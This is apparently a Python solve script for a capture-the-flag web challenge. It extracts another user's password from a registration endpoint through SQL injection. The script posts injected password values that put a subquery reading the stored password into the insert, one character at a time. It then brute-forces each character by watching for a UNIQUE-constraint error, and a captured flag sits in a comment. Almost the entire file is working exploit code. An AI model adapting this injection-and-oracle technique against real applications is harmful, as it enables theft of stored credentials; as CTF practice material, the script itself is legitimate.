import requests

url ="http://phish.sg.ctf.so/add"
flag=""#we{e0df7105-Xcd-4dc6-8349-f3ef83643a9@h0P3_u_didnt_u3e_sq1m4P}
padding="hhieubang"

def create_user(i,padding):
    data = {
            "username":"a",
            "password":f"n3mo1',(select '{padding}'||substr(password,{i},1) from User where username='shou'))-- -"
            }
    r= requests.post(url,data=data,)
    print(r.text)
def brute(j,padding):
    data = {
            "username":padding+chr(j),
            "password":"a"
            }
    r= requests.post(url,data=data)
    return r
for i in range(1,70):
    print(padding)
    create_user(i,padding)
    for j in range(32,128):
        #print(chr(j))
        if chr(j)!="'":
            r=brute(j,padding)
            #print(r.text)
            if "UNIQUE constraint" in r.text:
                flag+=chr(j)
                padding+=chr(j)
                print(flag)
                break